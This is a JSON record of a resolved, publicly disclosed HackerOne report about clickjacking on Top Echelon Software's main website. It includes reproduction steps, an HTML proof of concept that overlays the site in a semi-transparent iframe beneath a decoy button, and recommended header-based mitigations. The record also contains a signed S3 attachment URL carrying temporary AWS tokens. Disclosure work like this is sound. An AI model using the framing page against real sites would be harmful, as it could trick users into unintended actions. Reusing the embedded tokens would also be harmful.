@@ -1,0 +1,188 @@
+{
+  "id": 2964441,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY0NDQx",
+  "url": "https://hackerone.com/reports/2964441",
+  "title": "Clickjacking in main domain https://topechelon.com/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-01-29T13:57:32.845Z",
+  "submitted_at": "2025-01-29T13:57:33.227Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "genz-1",
+    "url": "/genz-1",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41357,
+    "url": "https://hackerone.com/top_echelon_software",
+    "handle": "top_echelon_software",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/357/dd634c95f35ea6225151c570fef8ab43e90c4cb8_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/357/dd634c95f35ea6225151c570fef8ab43e90c4cb8_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Top Echelon Software",
+      "twitter_handle": "",
+      "website": "https://www.topechelon.com",
+      "about": "https://www.topechelon.com/about/"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-10T13:17:10.542Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-31T04:06:10.136Z",
+  "team_member_agreed_on_going_public_at": "2025-02-10T13:17:10.232Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## **Summary:**  \nThe target website is vulnerable to Clickjacking, a web-based attack that tricks users into interacting with a hidden or disguised iframe. Attackers can exploit this vulnerability to manipulate user actions, potentially leading to unauthorized activities such as unintended clicks, form submissions, or credential theft.  \n\n## **Steps to Reproduce:**  \n1. **Create an HTML page** embedding the target website using an `<iframe>`.  \n2. **Modify CSS** to make the iframe transparent or overlay it with deceptive UI elements.  \n3. **Host the HTML page** and trick users into interacting with it.  \n\n## **Proof of Concept (PoC):**  \n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>Clickjacking PoC</title>\n<style>\n    iframe {\n        position: absolute;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        opacity: 0.6; /* Makes the iframe invisible */\n        z-index: 99;\n    }\n\n    button {\n        z-index: 100;\n        top:400px;\n        position: relative;\n    }\n    h1 {\n        top: 300px;\n        position: relative;\n\n    }\n</style>\n</head>\n<body>\n<h1>Click the button for a surprise!</h1>\n<button onclick=\"alert('Surprise!')\">Click Me!</button>\n\n<!-- Invisible iframe targeting the account deletion URL -->\n<iframe id=\"target-frame\" src=\"https://topechelon.com/\" frameborder=\"0\"></iframe>\n\n<script>\n    \n    document.getElementById('target-frame').onload = function() {\n        \n        console.log('Iframe has loaded, ready for clickjacking.');\n    };\n</script>\n</body>\n</html>\n```\n{F4001108}\n\n## Impact\n\n- **User Account Takeover:** If a logged-in user interacts with the iframe, attackers could force unintended actions.  \n- **Phishing Attacks:** Users may unknowingly enter sensitive credentials.  \n- **Malicious Actions:** Attackers can exploit user interactions to modify settings, submit forms, or perform other unintended operations.  \n\n## **Recommended Mitigation:**  \nTo prevent Clickjacking attacks, implement the following security measures:  \n\n1. **Use the X-Frame-Options HTTP Header:**  \n   - `X-Frame-Options: DENY` (Prevents embedding in iframes).  \n   - `X-Frame-Options: SAMEORIGIN` (Allows iframes only from the same domain).  \n\n2. **Use Content Security Policy (CSP) Frame-Ancestors Directive:**  \n   - `Content-Security-Policy: frame-ancestors 'self'`  \n\n3. **JavaScript-Based Frame Busting (as an additional security measure):**  \n   ```javascript\n   if (window.top !== window.self) {\n       window.top.location = window.self.location;\n   }",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4001108,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8oez30rl5b62z5hxpubdf3nltsaz?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX35O3LMV%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043411Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJHMEUCIAmMfaCUFTJ36zAG0Fd9aPRimbtq4Gf9hs%2Fxpxt3z7wQAiEA%2BKtLDYOtCE6tAkynQ1EUZx3lCSdSXMd5JyeMWZvY3sUqsgUIBhADGgwwMTM2MTkyNzQ4NDkiDCigKWcxe8SBCyiNhSqPBRSYpa0Q40Ut0J9wCR%2FS8g1F2g%2FExkaMJGLWgmmRUmLD534ER8f8r%2FNH0XEVuGHq6IxgeiWn%2FbmvWA4PsDao4tE%2FkwsT2zA067M8X6kk0lhbJNfGVIOZqF7SL%2BBez5agHmCEiT4j938ZqlscwgP6eTQGxc6GahPWmYt8hjymPKf68dvkEbh04xDNPW9E8%2BiHh7Rn8M8hFuJHbxidCjgJFaw9PeZk8y80TigKn8fnfbcuf1tk6ychLdJxrFbe4DMllOF9ageAiHsbhwswKdswtw1a5wCcDERyoUyFycIpSFe6IoWvrSpTF2sjxhtGqYvKdekc4rfkOwyDNMKI6l%2BauESPWPUQwZGlF2MGZ583udyyEkVtnr8A9Od69UKMVMRS5fEow9qsHV%2BjUIx%2FJQ3k3HK%2Fn%2BhWd6I31s5apJiEzrL768FlmWTz68gDKTmH2NUxZ45Iu0PYOpjrPftfICrpHP5CCI0lFGA6CYuNNNx5ogv6Z%2Beci76nUlgSUVm%2FPVQ%2BMF3gOofDU%2FoYmnFMzr8NHlPhLHolfzHu8TqULXTMhlGxXQhVUeRudVo4k7gUcf5%2B562QWXcQsKgaByEqNfCJetIODIlpD9XfM%2Bh1JonDG9TKV78rMLdFGiRHjJRtflBkLMxxNhv5SrXdrGce2oJXKAwZ8FHvweUpFe7qkWALdviRohoGsUx02miAB4UGJZ3kQYtbgRY1G5dcrsV7F6x1Mmp23kfw2yxoiVyKjf30sUFIAVv1PjCwWwlty%2BJAmymun4JLMw%2BktG%2BbXBBDt0CGYd2fcXu%2BPHZD2Di7rs80FDowZs8BJJlPweA%2BgrEmC1A2NAM%2F2c%2BPgmWYmOw7%2Bi40JV6HzOj8vE8rDZzC0%2BeaUJMwqfOc0gY6sQF5D%2BlM4mJf57Z7SF9VP1dP9RsOEhyzLb5h6n7mlKLwcZDIP1izwlNLPfg1zLMQpMKcX1wNFQfvFxgJVS4kF6lm35qKOsxu09OVtLu6q7AI48SB2AD7RxtfkVKN7iFE2ZfAC%2Fmjko5nMGbyIQTy0LplejWSlY3HnJkOiPIIBovneL8o%2B%2BBWL3dYJKxiGEwnw3nSaWFk5h1JIGzWmmjlr55DpSHb3lxV%2FS03g5DiNzqSxBk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e2bf2a44ae94bca417b1ac9eb57a2c646cb3375195e9b8be78c5092b1f1c1e6",
+      "file_size": 96481,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 80,
+  "voters": [
+    "aboalezz",
+    "loaymorad",
+    "terminallogic",
+    "starlox",
+    "raslanco",
+    "mohaned0101",
+    "thalaivar304",
+    "shubham_srt",
+    "jmo740",
+    "sisi0x",
+    "and 70 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 31913,
+    "asset_type": "URL",
+    "asset_identifier": "www.topechelon.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "2964441",
+  "votes": 80,
+  "latest_disclosable_activity_at": "2025-02-10T13:17:10.763Z",
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-03T12:34:12.009929",
+    "source": "https://hackerone.com/reports/2964441.json",
+    "report_id": 2964441
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY0NDQx",
+    "databaseId": "2964441",
+    "title": "Clickjacking in main domain https://topechelon.com/",
+    "url": "https://hackerone.com/reports/2964441",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2025-02-10T13:17:10.542Z",
+    "created_at": "2025-01-29T13:57:32.845Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "genz-1"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNDEzNTc=",
+      "handle": "top_echelon_software",
+      "name": "Top Echelon Software",
+      "url": "https://hackerone.com/top_echelon_software",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI5NjQ0NDE=",
+    "_id": "2964441",
+    "disclosed": true,
+    "votes": 80,
+    "latest_disclosable_activity_at": "2025-02-10T13:17:10.763Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY0NDQx",
+      "databaseId": "2964441",
+      "title": "Clickjacking in main domain https://topechelon.com/",
+      "url": "https://hackerone.com/reports/2964441",
+      "disclosed_at": "2025-02-10T13:17:10.542Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNDEzNTc=",
+      "handle": "top_echelon_software",
+      "name": "Top Echelon Software",
+      "url": "https://hackerone.com/top_echelon_software",
+      "currency": "usd"
+    }
+  }
+}
